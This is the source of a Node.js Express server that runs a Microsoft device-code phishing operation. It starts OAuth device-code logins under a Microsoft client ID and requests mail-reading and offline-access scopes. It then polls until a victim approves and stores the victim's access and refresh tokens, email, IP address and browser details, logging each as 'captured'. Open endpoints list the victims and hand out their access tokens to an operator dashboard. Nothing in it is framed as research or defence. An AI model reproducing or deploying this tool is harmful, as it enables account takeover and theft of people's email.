const express = require('express');
const axios = require('axios');
const cors = require('cors');
const crypto = require('crypto');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Store sessions and pending codes
let userSessions = new Map();
let pendingDeviceCodes = new Map();

// Helper functions
function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
}

// Start device authentication
app.post('/api/auth/start', async (req, res) => {
    try {
        const clientIp = getClientIp(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';
        
        // Microsoft's working device code endpoint
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: '1950a258-227b-4e31-a9cf-717495945fc2',
                scope: 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, verification_uri, expires_in } = response.data;
        const sessionId = crypto.randomBytes(16).toString('hex');
        
        pendingDeviceCodes.set(device_code, {
            device_code,
            user_code,
            sessionId,
            status: 'pending',
            ip: clientIp,
            userAgent: userAgent,
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        // Start polling for token
        pollForToken(device_code, sessionId);
        
        res.json({
            success: true,
            sid: parseInt(sessionId.slice(0, 8), 16),
            user_code: user_code,
            verification_uri: verification_uri
        });
        
    } catch (err) {
        console.error('Error:', err.message);
        res.status(500).json({ error: 'Failed to start authentication' });
    }
});

// Poll for token
async function pollForToken(device_code, sessionId) {
    const pollInterval = setInterval(async () => {
        const pending = pendingDeviceCodes.get(device_code);
        if (!pending || pending.status !== 'pending') {
            clearInterval(pollInterval);
            return;
        }
        
        try {
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: '1950a258-227b-4e31-a9cf-717495945fc2',
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            const tokens = response.data;
            
            // Get user info
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            const session = {
                sessionId: sessionId,
                email: userInfo.data.mail || userInfo.data.userPrincipalName,
                displayName: userInfo.data.displayName,
                ip: pending.ip,
                userAgent: pending.userAgent,
                tokens: tokens,
                createdAt: new Date().toISOString()
            };
            
            userSessions.set(sessionId, session);
            pending.status = 'captured';
            pending.email = session.email;
            pendingDeviceCodes.delete(device_code);
            clearInterval(pollInterval);
            
            console.log(`✅ Token captured for: ${session.email}`);
            
        } catch (err) {
            if (err.response?.data?.error !== 'authorization_pending') {
                console.log('Waiting for user approval...');
            }
        }
    }, 3000);
}

// Status endpoint (matches friend's code pattern)
app.get('/api/status/:sid', async (req, res) => {
    const { sid } = req.params;
    
    // Find session by numeric ID
    let session = null;
    for (const [key, value] of userSessions.entries()) {
        const numericId = parseInt(key.slice(0, 8), 16);
        if (numericId == sid) {
            session = value;
            break;
        }
    }
    
    if (session) {
        return res.json({ 
            status: 'captured', 
            email: session.email,
            displayName: session.displayName
        });
    }
    
    // Check pending codes
    for (const pending of pendingDeviceCodes.values()) {
        const numericId = parseInt(pending.sessionId.slice(0, 8), 16);
        if (numericId == sid) {
            return res.json({ status: pending.status });
        }
    }
    
    res.json({ status: 'not_found' });
});

// Get all sessions for dashboard
app.get('/api/sessions', async (req, res) => {
    const sessions = Array.from(userSessions.values()).map(s => ({
        sessionId: s.sessionId,
        email: s.email,
        displayName: s.displayName,
        ip: s.ip,
        userAgent: s.userAgent,
        createdAt: s.createdAt
    }));
    res.json({ sessions });
});

// Get session token
app.get('/api/session/token/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    const session = userSessions.get(sessionId);
    
    if (!session) {
        return res.status(404).json({ error: 'Session not found' });
    }
    
    res.json({
        email: session.email,
        token: session.tokens.access_token
    });
});

// Clear all sessions
app.delete('/api/sessions/clear', async (req, res) => {
    userSessions.clear();
    res.json({ success: true });
});

// Serve dashboard
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Dashboard running on port ${PORT}`);
});
